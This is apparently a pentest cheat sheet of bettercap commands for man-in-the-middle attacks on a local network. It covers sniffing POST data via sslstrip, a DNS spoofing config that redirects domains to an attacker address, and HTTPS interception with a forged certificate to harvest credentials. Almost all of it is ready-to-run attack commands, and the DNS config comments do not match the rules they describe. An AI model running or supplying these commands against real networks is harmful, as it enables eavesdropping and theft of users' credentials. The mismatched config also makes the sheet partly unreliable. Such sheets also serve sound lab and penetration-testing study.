
Sniffs POSTs using bettercap and sslstrip
-----------------------------------------
```
# Does not really work well on modern TLS implementations (might be worth a try though....)
bettercap -T 10.10.10.5 --proxy -P POST
```
Intercept DNS traffic 
---------------------
```
# Create config file as below (name the file dns.conf)

# Empty lines or lines starting with # will be ignored.
# redirect *.google.com to the attacker ip address
10.10.10.170 .*london\.ca
# redirect *.microsoft.com to 10.10.10.10
10.10.10.6 .*london\.ca

# Run bettercap 
bettercap --dns ./dns.conf
```
```
MITM SSL/TLS certificate (user will get cert warning) to gather creds
---------------------------------------------------------------------
bettercap -T 10.10.10.5 -X --proxy-https
```
